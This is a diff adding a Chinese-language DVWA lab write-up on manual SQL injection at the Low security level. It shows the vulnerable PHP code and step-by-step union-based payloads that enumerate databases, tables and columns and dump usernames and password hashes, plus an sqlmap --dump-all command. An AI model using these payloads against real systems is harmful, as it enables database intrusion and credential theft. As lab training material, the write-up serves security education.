@@ -370,6 +370,187 @@
 <p><code>sqlmap -u &quot;http://192.168.213.136/vulnerabilities/sqli/?id=1&amp;Submit=%E6%8F%90%E4%BA%A4#&quot; --cookie=&quot;security=low; PHPSESSID=blmgf8bl931863uc8rf70jbfv0&quot; -Ddvwa --dump-all --batch</code>
 <img src="../static/img/zhuru4.png" alt="avatar">
 <img src="../static/img/zhuru5.png" alt="avatar"></p>
+<p><strong>Web&#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#x4E0E;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;</strong></p>
+<pre><code class="lang-undefined">&#x4E00;&#x3001;&#x6D4B;&#x8BD5;&#x9700;&#x6C42;&#x5206;&#x6790;
+&#x4E8C;&#x3001;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x6CE8;&#x5165;&#x7684;&#x7C7B;&#x578B;
+&#x4E09;&#x3001;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;
+    1.&#x731C;&#x89E3;&#x6240;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x76EE;
+    2.&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x663E;&#x793A;&#x4F4D;
+    3.&#x901A;&#x8FC7;&#x663E;&#x793A;&#x4F4D;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;
+    4.&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x540D;
+    5.&#x83B7;&#x53D6;&#x8868;&#x4E2D;&#x7684;&#x5217;&#x540D;&#xFF08;&#x5B57;&#x6BB5;&#xFF09;
+    6.&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;
+    7.&#x9A8C;&#x8BC1;&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x7684;&#x6709;&#x6548;&#x6027;
+</code></pre>
+<h3 id="&#x4E00;&#x3001;&#x6D4B;&#x8BD5;&#x9700;&#x6C42;&#x5206;&#x6790;">&#x4E00;&#x3001;&#x6D4B;&#x8BD5;&#x9700;&#x6C42;&#x5206;&#x6790;</h3>
+<blockquote>
+<p><strong>&#x6D4B;&#x8BD5;&#x5BF9;&#x8C61;</strong>&#xFF1A;DVWA&#x6F0F;&#x6D1E;&#x7CFB;&#x7EDF;--SQL Injection&#x6A21;&#x5757;--User ID&#x63D0;&#x4EA4;&#x529F;&#x80FD;
+ <strong>&#x9632;&#x5FA1;&#x7B49;&#x7EA7;</strong>&#xFF1A;Low
+ <strong>&#x6D4B;&#x8BD5;&#x76EE;&#x6807;</strong>&#xFF1A;&#x5224;&#x65AD;&#x88AB;&#x6D4B;&#x6A21;&#x5757;&#x662F;&#x5426;&#x5B58;&#x5728;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#xFF0C;&#x6F0F;&#x6D1E;&#x662F;&#x5426;&#x53EF;&#x5229;&#x7528;&#xFF0C;&#x82E5;&#x53EF;&#x4EE5;&#x5219;&#x68C0;&#x6D4B;&#x51FA;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5E93;&#x6570;&#x636E;
+ <strong>&#x6D4B;&#x8BD5;&#x65B9;&#x5F0F;</strong>&#xFF1A;&#x624B;&#x5DE5;&#x65B9;&#x5F0F;</p>
+</blockquote>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-9377b33e3c025d2f.png?imageMogr2/auto-orient/strip|imageView2/2/w/564/format/webp" alt="img"></p>
+<p>&#x88AB;&#x6D4B;&#x6A21;&#x5757;</p>
+<p>&#x9632;&#x5FA1;&#x7B49;&#x7EA7;&#x4E3A;Low&#x7684;&#x540E;&#x7AEF;&#x63A7;&#x5236;&#x4EE3;&#x7801;&#xFF1A;
+<strong>low.php</strong></p>
+<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( $_REQUEST[ <span class="hljs-string">&apos;Submit&apos;</span> ] ) ) {
+    <span class="hljs-comment">// Get input</span>
+    $id = $_REQUEST[ <span class="hljs-string">&apos;id&apos;</span> ];
+
+    <span class="hljs-comment">// Check database</span>
+    $query  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;</span>;
+    $result = mysqli_query($GLOBALS[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&apos;&lt;pre&gt;&apos;</span> . ((is_object($GLOBALS[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="hljs-keyword">false</span>)) . <span class="hljs-string">&apos;&lt;/pre&gt;&apos;</span> );
+
+    <span class="hljs-comment">// Get results</span>
+    <span class="hljs-keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) {
+        <span class="hljs-comment">// Get values</span>
+        $first = $row[<span class="hljs-string">&quot;first_name&quot;</span>];
+        $last  = $row[<span class="hljs-string">&quot;last_name&quot;</span>];
+
+        <span class="hljs-comment">// Feedback for end user</span>
+        $html .= <span class="hljs-string">&quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;</span>;
+    }
+
+    mysqli_close($GLOBALS[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);
+}
+
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>&#x4EE5;&#x4E0A;&#x4EE3;&#x7801;&#x6240;&#x6784;&#x9020;sql&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x4E2D;&#x7684;&#x53C2;&#x6570;id&#xFF0C;&#x662F;&#x4ECE;&#x524D;&#x7AEF;&#x6240;&#x63D0;&#x4EA4;&#x5230;&#x540E;&#x7AEF;&#xFF0C;&#x4EE3;&#x7801;&#x4E2D;&#x5E76;&#x6CA1;&#x6709;&#x5BF9;&#x6765;&#x81EA;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4EA4;&#x7684;&#x53C2;&#x6570;id&#x8FDB;&#x884C;&#x5408;&#x6CD5;&#x6027;&#x68C0;&#x67E5;&#x548C;&#x8FC7;&#x6EE4;&#x654F;&#x611F;&#x5B57;&#x7B26;&#x7B49;&#x64CD;&#x4F5C;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x80FD;&#x63A2;&#x6D4B;&#x51FA;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x4E00;&#x6B65;&#x5229;&#x7528;&#x6765;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;or&#x5176;&#x4ED6;&#x64CD;&#x4F5C;&#x6743;&#x9650;&#x3002;</p>
+<p>&#x5F53;&#x5B9E;&#x9645;&#x8FDB;&#x884C;&#x68C0;&#x6D4B;&#x65F6;&#xFF0C;&#x4E00;&#x5F00;&#x59CB;&#x5E76;&#x4E0D;&#x77E5;&#x9053;&#x540E;&#x7AEF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x7C7B;&#x4F3C;&#x4E8E;&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;&#xFF0C;&#x6784;&#x9020;&#x4E00;&#x4E9B;&#x7279;&#x5B9A;&#x7684;&#x8F93;&#x5165;&#x5B57;&#x7B26;&#x5411;&#x670D;&#x52A1;&#x7AEF;&#x63D0;&#x4EA4;&#xFF0C;&#x6839;&#x636E;&#x54CD;&#x5E94;&#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x3002;</p>
+<h4 id="&#x4E8C;&#x3001;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x6CE8;&#x5165;&#x7684;&#x7C7B;&#x578B;">&#x4E8C;&#x3001;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x4EE5;&#x53CA;&#x6CE8;&#x5165;&#x7684;&#x7C7B;&#x578B;</h4>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;&#x5355;&#x5F15;&#x53F7; <code>&apos;</code>   &#x53CD;&#x659C;&#x6760;<code>\</code></p>
+</blockquote>
+<p><strong>query</strong>&#xFF1A;&#xFF08;&#x4E00;&#x5F00;&#x59CB;&#x5E76;&#x4E0D;&#x77E5;&#x6653;&#x4EE3;&#x7801;&#x4E2D;&#x8BBE;&#x7F6E;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x53EF;&#x7531;&#x540E;&#x9762;&#x6B65;&#x9AA4;&#x6765;&#x63A8;&#x6D4B;&#xFF09;
+ <code>SELECT first_name, last_name FROM users WHERE user_id = &apos;&apos;&apos;;</code>
+ <code>SELECT first_name, last_name FROM users WHERE user_id = &apos;\&apos;;</code>
+ <strong>&#x8F93;&#x51FA;</strong>&#xFF1A;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#xFF0C;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x4FE1;&#x606F;&#xFF0C;&#x66B4;&#x9732;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7C7B;&#x578B;&#x4E3A;Mysql</p>
+<ul>
+<li>&#x5BF9;&#x4E8E;Mysql&#xFF0C;&#x6784;&#x9020;SQL&#x6CE8;&#x5165;&#x653B;&#x51FB;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x65F6;&#x5E38;&#x4F1A;&#x7528;&#x5230;&#x7684;&#x6CE8;&#x91CA;&#x7B26;&#x6709;<code>#</code> &#x548C; <code>--</code> &#xFF08;&#x53CC;&#x6A2A;&#x6760;&#x540E;&#x9762;&#x52A0;&#x7A7A;&#x683C;&#x8054;&#x7528;&#xFF09;&#x3002;</li>
+<li>Mysql&#x5B89;&#x88C5;&#x540E;&#x9ED8;&#x8BA4;&#x4F1A;&#x521B;&#x5EFA;&#x4E09;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF1A;information_schema&#x3001;mysql&#x548C;test&#x3002;&#x5176;&#x4E2D;&#x540D;&#x4E3A;&#x201C;mysql&#x201D;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x5B83;&#x91CC;&#x9762;&#x4FDD;&#x5B58;&#x6709;MYSQL&#x7684;&#x7CFB;&#x7EDF;&#x4FE1;&#x606F;&#x3001;&#x7528;&#x6237;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x548C;&#x65B0;&#x589E;&#x7528;&#x6237;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x8BE5;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6709;&#x5173;&#x6570;&#x636E;&#x8868;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</li>
+</ul>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-c88e301c58e19f98.png?imageMogr2/auto-orient/strip|imageView2/2/w/990/format/webp" alt="img"></p>
+<p>&#x5355;&#x5F15;&#x53F7;&#x63D0;&#x4EA4;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-da372624f2a87929.png?imageMogr2/auto-orient/strip|imageView2/2/w/471/format/webp" alt="img"></p>
+<p>&#x53CD;&#x659C;&#x6760;&#x63D0;&#x4EA4;</p>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;&#x53CC;&#x5F15;&#x53F7; <code>&quot;</code></p>
+</blockquote>
+<p><strong>query</strong>&#xFF1A;<code>SELECT first_name, last_name FROM users WHERE user_id = &apos;&quot;&apos;;</code>
+ <strong>&#x8F93;&#x51FA;</strong>&#xFF1A;&#x8BED;&#x6CD5;&#x65E0;&#x5F02;&#x5E38;&#xFF0C;&#x4F46;&#x662F;&#x65E0;&#x6B64;id&#x7684;&#x6570;&#x636E;&#x53EF;&#x67E5;&#x8BE2;&#x51FA;&#x6765;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-b54d4207737a927b.png?imageMogr2/auto-orient/strip|imageView2/2/w/614/format/webp" alt="img"></p>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;<code>1</code></p>
+</blockquote>
+<p><strong>query</strong>&#xFF1A;<code>SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos;;</code>
+ <strong>&#x8F93;&#x51FA;</strong>&#xFF1A;&#x67E5;&#x8BE2;&#x51FA;&#x5BF9;&#x5E94;&#x7684;ID&#x3001;First name&#x3001;Surname &#x5B57;&#x6BB5;&#x540D;&#x53CA;&#x5176;&#x503C;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-daefe3b537714a95.png?imageMogr2/auto-orient/strip|imageView2/2/w/369/format/webp" alt="img"></p>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;
+ <code>1&apos; or 1=1 #</code>
+ <code>1&apos; or 1=1 --</code> (&#x672B;&#x5C3E;&#x4E3A;&#x7A7A;&#x683C;)
+ <code>1&apos; or &apos;abc&apos;=&apos;abc</code></p>
+</blockquote>
+<p><strong>query</strong>&#xFF1A;
+ <code>SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos; or 1=1 #&apos;;</code>
+ <code>SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos; or 1=1 -- &apos;;</code>
+ <code>SELECT first_name, last_name FROM users WHERE user_id = &apos;1&apos; or &apos;abc&apos;=&apos;abc&apos;;</code>
+ <strong>&#x8F93;&#x51FA;</strong>&#xFF1A;&#x6784;&#x9020;&#x7684;&#x6C38;&#x771F;&#x6761;&#x4EF6;&#x8FDB;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;&#x5217;&#x51FA;&#x4E86;&#x8868;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x7684;ID&#x3001;First_name&#x3001;Surname</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-a103110a9226c6ad.png?imageMogr2/auto-orient/strip|imageView2/2/w/598/format/webp" alt="img"></p>
+<p>&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x6570;&#x5B57;1,2,3,4,5,6...&#x6765;&#x5224;&#x65AD;&#x7528;&#x6237;&#x8868;&#x4E2D;&#x7684;&#x884C;&#x6570;&#xFF08;rows&#xFF09;&#x4E3A;5&#x884C;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-7d756d0262fefc2d.png?imageMogr2/auto-orient/strip|imageView2/2/w/592/format/webp" alt="img"></p>
+<p>&#x4ECE;&#x4EE5;&#x4E0A;&#x53EF;&#x5224;&#x65AD;&#x51FA;url&#xFF08;<a href="http://localhost:8001/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#xFF09;&#x4E2D;&#x7684;&#x53C2;&#x6570;id&#x5B58;&#x5728;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5B58;&#x5728;**&#x5B57;&#x7B26;&#x578B;**&#x7684;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;" target="_blank">http://localhost:8001/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#xFF09;&#x4E2D;&#x7684;&#x53C2;&#x6570;id&#x5B58;&#x5728;&#x6CE8;&#x5165;&#x70B9;&#xFF0C;&#x5B58;&#x5728;**&#x5B57;&#x7B26;&#x578B;**&#x7684;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</a></p>
+<h3 id="&#x4E09;&#x3001;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;">&#x4E09;&#x3001;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;</h3>
+<h4 id="1&#x731C;&#x89E3;&#x6240;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x76EE;">1.&#x731C;&#x89E3;&#x6240;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x76EE;</h4>
+<p>&#x65B9;&#x5F0F;1&#xFF1A;<strong>order by num</strong>
+ &#x82E5;num&#x6570;&#x503C;&#x8D85;&#x8FC7;&#x4E86;&#x5B57;&#x6BB5;&#x6570;&#xFF0C;&#x5219;&#x67E5;&#x8BE2;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x51FA;select&#x8BED;&#x53E5;&#x6240;&#x67E5;&#x8BE2;&#x5B57;&#x6BB5;&#x7684;&#x6570;&#x76EE;</p>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;
+ <code>1&apos; order by 2 #</code>
+ <code>1&apos; order by 3 #</code></p>
+</blockquote>
+<p><strong>&#x8F93;&#x51FA;</strong>&#xFF1A;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-27fc41a95b42c138.png?imageMogr2/auto-orient/strip|imageView2/2/w/445/format/webp" alt="img"></p>
+<p>&#x4EE5;&#x4E0A;&#xFF0C;&#x7528;<code>1&apos; order by 2 #</code>&#x8FDB;&#x884C;&#x63D0;&#x4EA4;&#xFF0C;&#x53EF;&#x6B63;&#x5E38;&#x67E5;&#x8BE2;&#x51FA;ID=1&#x7684;2&#x4E2A;&#x5B57;&#x6BB5;&#x503C;&#xFF1B;&#x7528;<code>1&apos; order by 3 #</code>&#x8FDB;&#x884C;&#x63D0;&#x4EA4;&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x63D0;&#x793A;&#x3002;&#x8BF4;&#x660E;&#x6B64;&#x5904;&#x7684;select&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x4E2D;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x6709;2&#x4E2A;</p>
+<p>&#x65B9;&#x5F0F;2&#xFF1A;<strong>union select 1,2,3...</strong>
+ &#x82E5;union select&#x540E;&#x7684;&#x6570;&#x5B57;&#x4F4D;&#xFF08;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;1/2/3&#xFF0C;&#x53EA;&#x8981;&#x6709;&#x6570;&#x5B57;&#x5360;&#x4F4D;&#x5373;&#x53EF;&#xFF09;&#x4E0E;&#x5B9E;&#x9645;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x4F4D;&#x4E0D;&#x5B8C;&#x5168;&#x5BF9;&#x5E94;&#x65F6;&#xFF0C;&#x67E5;&#x8BE2;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x76F4;&#x81F3;&#x8C03;&#x6574;&#x5230;&#x4E0D;&#x62A5;&#x9519;&#x65F6;&#x7684;&#x5360;&#x4F4D;&#x4E2A;&#x6570;&#xFF0C;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x5B9E;&#x9645;&#x67E5;&#x8BE2;&#x7684;&#x5B57;&#x6BB5;&#x6570;</p>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;
+ <code>1&apos; union select 1 #</code>
+ <code>1&apos; union select 1,2 #</code>
+ <code>1&apos; union select 1,2,3 #</code></p>
+</blockquote>
+<p><strong>&#x8F93;&#x51FA;</strong>&#xFF1A;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-2d5a2fc1d9aff9fa.png?imageMogr2/auto-orient/strip|imageView2/2/w/561/format/webp" alt="img"></p>
+<p>&#x4EE5;&#x4E0A;&#xFF0C;&#x53EA;&#x6709;<code>1&apos; union select 1,2 #</code>&#x6784;&#x9020;&#x7684;&#x8BED;&#x53E5;&#x624D;&#x80FD;&#x6B63;&#x5E38;&#x5339;&#x914D;&#x51FA;&#x5B57;&#x6BB5;&#x503C;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x67E5;&#x8BE2;&#x5B57;&#x6BB5;&#x6570;=2</p>
+<h4 id="2&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x663E;&#x793A;&#x4F4D;">2.&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x663E;&#x793A;&#x4F4D;</h4>
+<p>&#x5728;&#x9875;&#x9762;&#x4E0A;&#x4F1A;&#x663E;&#x793A;&#x4ECE;select&#x8BED;&#x53E5;&#x4E2D;&#x9009;&#x53D6;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x901A;&#x8FC7;&#x4EE5;&#x4E0A;&#x65B9;&#x5F0F;2&#x4E2D;&#x7684;<strong>union select 1,2,3...</strong>&#x53EF;&#x5224;&#x65AD;&#x51FA;&#x5177;&#x4F53;&#x663E;&#x793A;&#x5B57;&#x6BB5;&#x7684;&#x663E;&#x793A;&#x4F4D;
+ <strong>&#x663E;&#x793A;&#x4F4D;&#x7684;&#x4F5C;&#x7528;</strong>&#xFF1A;&#x5728;&#x77E5;&#x9053;&#x663E;&#x793A;&#x4F4D;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x663E;&#x793A;&#x4F4D;&#x6765;&#x663E;&#x793A;&#x6211;&#x4EEC;&#x60F3;&#x77E5;&#x9053;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x7B49;...</p>
+<blockquote>
+<p><strong>&#x8F93;&#x5165;</strong>&#xFF1A;<code>1&apos; union select 1,2 #</code></p>
+</blockquote>
+<p><strong>&#x8F93;&#x51FA;</strong>&#xFF1A;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-3ebaba44a0c6354e.png?imageMogr2/auto-orient/strip|imageView2/2/w/291/format/webp" alt="img"></p>
+<p>&#x663E;&#x793A;&#x4F4D;</p>
+<h4 id="3&#x901A;&#x8FC7;&#x663E;&#x793A;&#x4F4D;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;">3.&#x901A;&#x8FC7;&#x663E;&#x793A;&#x4F4D;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;</h4>
+<p>&#x6B64;&#x5904;&#x4F1A;&#x7528;&#x5230;Mysql&#x6CE8;&#x5165;&#x5E38;&#x7528;&#x7684;&#x4E00;&#x4E9B;&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x53C2;&#x770B;&#x6B64;&#x6587;==&gt;<a href="https://www.jianshu.com/p/fcc5d8e69d68" target="_blank">SQL&#x6CE8;&#x5165;&#x5E38;&#x7528;&#x7684;&#x5185;&#x7F6E;&#x51FD;&#x6570;&#x6574;&#x7406;(&#x4EE5;MySql&#x4E3A;&#x4F8B;)</a></p>
+<ul>
+<li>&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#x3001;DBMS&#x7684;&#x7248;&#x672C;(Mysql&#x7684;&#x7248;&#x672C;)
+   <code>1&apos; union select database(),version() #</code> </li>
+</ul>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-f0cf0dac17956f80.png?imageMogr2/auto-orient/strip|imageView2/2/w/318/format/webp" alt="img"></p>
+<p>&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x7684;&#x6570;&#x636E;&#x5E93;=dvwa&#xFF1B;Mysql&#x7248;&#x672C;=5.5.53</p>
+<ul>
+<li>&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;
+   <code>1&apos; union select user(),2 #</code> </li>
+</ul>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-a3efcdc65dc935b6.png?imageMogr2/auto-orient/strip|imageView2/2/w/279/format/webp" alt="img"></p>
+<p>&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7528;&#x6237;&#x4E3A;root&#xFF0C;&#x5373;&#x8D85;&#x7BA1;&#x6743;&#x9650;&#x7528;&#x6237;</p>
+<ul>
+<li>&#x83B7;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3001;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B58;&#x50A8;&#x76EE;&#x5F55;
+   <code>1&apos; union select @@version_compile_os,@@datadir #</code> </li>
+</ul>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-406ef4112df4cd7f.png?imageMogr2/auto-orient/strip|imageView2/2/w/468/format/webp" alt="img"></p>
+<p>&#x670D;&#x52A1;&#x5668;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;=Win32&#xFF1B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B58;&#x50A8;&#x76EE;&#x5F55;&#x4E3A;...\MySQL\data\</p>
+<h4 id="4&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x540D;">4.&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x540D;</h4>
+<ul>
+<li>&#x83B7;&#x53D6;DBMS&#x4E2D;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x79F0;
+   <code>1&apos; union select 1,schema_name from information_schema.schemata #</code> </li>
+</ul>
+<p>Mysql&#x5B89;&#x88C5;&#x540E;&#x9ED8;&#x8BA4;&#x4F1A;&#x521B;&#x5EFA;&#x4E09;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF1A;information_schema&#x3001;mysql&#x548C;test&#xFF1B;<code>information_schema</code>&#x5E93;&#x4E0B;&#x7684;<code>schemata</code>&#x8868;&#x4E2D;&#x4FDD;&#x5B58;&#x7740;DBMS&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x540D;&#x79F0;&#x4FE1;&#x606F;</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-7417a9c6958e21b8.png?imageMogr2/auto-orient/strip|imageView2/2/w/469/format/webp" alt="img"></p>
+<ul>
+<li>&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;(dvwa)&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;
+   <code>1&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code> </li>
+</ul>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-a7b0f3140f628e31.png?imageMogr2/auto-orient/strip|imageView2/2/w/735/format/webp" alt="img"></p>
+<p>dvwa&#x5E93;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8868;&#x4E3A;&#xFF1A;guestbook&#x3001;users</p>
+<h4 id="5&#x83B7;&#x53D6;&#x8868;&#x4E2D;&#x7684;&#x5217;&#x540D;&#xFF08;&#x5B57;&#x6BB5;&#xFF09;">5.&#x83B7;&#x53D6;&#x8868;&#x4E2D;&#x7684;&#x5217;&#x540D;&#xFF08;&#x5B57;&#x6BB5;&#xFF09;</h4>
+<p>&#x65B9;&#x5F0F;1&#xFF1A;
+ <code>1&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; #</code></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-7b55fedb658b33d9.png?imageMogr2/auto-orient/strip|imageView2/2/w/712/format/webp" alt="img"></p>
+<p>&#x8868;&#x5B57;&#x6BB5;&#xFF1A;user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>
+<h4 id="6&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;">6.&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;</h4>
+<p>&#x83B7;&#x53D6;users&#x8868;&#x4E2D;&#x6240;&#x6709;user&#x548C;password&#x6570;&#x636E;&#xFF0C;&#x7528;&#x7B26;&#x5408;&apos;--&apos;&#x8FDE;&#x63A5;&#x6BCF;&#x4E00;&#x7EC4;&#x4E2D;user&#x548C;password&#xFF0C;&#x6BCF;&#x4E00;&#x7EC4;&quot;user--password&quot;&#x53C8;&#x5206;&#x522B;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#xFF0C;&#x96C6;&#x4E2D;&#x5728;&#x4E00;&#x8D77;&#x8F93;&#x51FA;&#x7ED3;&#x679C;
+ <code>1&apos; union select 1,group_concat(concat_ws(&apos;--&apos;,user,password)) from users #</code></p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/4866277-7e8cc73628114941.png?imageMogr2/auto-orient/strip|imageView2/2/w/853/format/webp" alt="img"></p>
